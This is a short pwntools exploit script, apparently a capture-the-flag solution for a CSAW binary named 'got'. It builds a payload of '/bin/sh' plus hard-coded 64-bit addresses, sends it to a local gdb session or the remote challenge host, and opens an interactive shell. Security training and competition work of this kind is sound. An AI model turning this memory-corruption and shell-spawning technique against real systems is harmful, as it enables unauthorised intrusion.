#!/usr/bin/python

from pwn import *
import sys

script='''
break *0x0040078f
break *0x004007cf
'''

def hunt():
    pause()
    #r.sendline(cyclic(128,n=8))
    buf = "/bin/sh" + "\x00"+  p64(0x0040074b) + p64(0x004005c6) + p64(0x00601010)
    r.sendline(buf)
    r.interactive()


if __name__ == '__main__':
    context.clear(arch='amd64')
    context.terminal = ['tmux', 'splitw', '-v']
    binary = "./got"

    log.info("For remote: %s remote" % sys.argv[0])
    host, port = "pwn.chal.csaw.io 10105".split()

    if len(sys.argv) > 1:
        r = remote(host, int(port))
        hunt()
    else:
        r = gdb.debug(binary,gdbscript=script, env={"LD_PRELOAD":""})
        hunt()
